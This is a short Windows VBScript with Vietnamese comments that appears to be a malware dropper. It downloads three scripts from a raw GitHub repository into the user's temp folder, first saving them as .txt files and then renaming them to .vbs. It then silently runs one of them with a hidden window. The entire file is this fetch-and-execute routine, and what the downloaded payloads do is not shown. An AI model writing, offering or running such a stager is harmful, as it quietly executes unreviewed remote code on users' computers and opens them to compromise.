Dim shell, fso, tempFolder

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Lấy Temp thật
tempFolder = shell.ExpandEnvironmentStrings("%TEMP%") & "\"

' Các link raw
url1 = "https://raw.githubusercontent.com/2UY5/2/refs/heads/main/1.vbs"
url2 = "https://raw.githubusercontent.com/2UY5/2/refs/heads/main/2.vbs"
url3 = "https://raw.githubusercontent.com/2UY5/2/refs/heads/main/3.vbs"

' File tạm .txt
txt1 = tempFolder & "1.txt"
txt2 = tempFolder & "2.txt"
txt3 = tempFolder & "3.txt"

' File đích .vbs
vbs1 = tempFolder & "1.vbs"
vbs2 = tempFolder & "2.vbs"
vbs3 = tempFolder & "3.vbs"

' =============================
' Hàm tải file
Function DownloadFile(url, savePath)
    Dim http, stream
    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
    http.Open "GET", url, False
    http.Send
    If http.Status = 200 Then
        Set stream = CreateObject("ADODB.Stream")
        stream.Type = 1 ' binary
        stream.Open
        stream.Write http.responseBody
        stream.SaveToFile savePath, 2
        stream.Close
        DownloadFile = True
    Else
        DownloadFile = False
    End If
End Function

' =============================
' Tải 3 file về dạng txt
DownloadFile url1, txt1
DownloadFile url2, txt2
DownloadFile url3, txt3

' Nếu file .vbs đã tồn tại thì xóa trước
If fso.FileExists(vbs1) Then fso.DeleteFile vbs1, True
If fso.FileExists(vbs2) Then fso.DeleteFile vbs2, True
If fso.FileExists(vbs3) Then fso.DeleteFile vbs3, True

' Đổi tên txt -> vbs
fso.MoveFile txt1, vbs1
fso.MoveFile txt2, vbs2
fso.MoveFile txt3, vbs3

' =============================
' Chạy 3.vbs
shell.Run "wscript.exe """ & vbs3 & """", 0, False
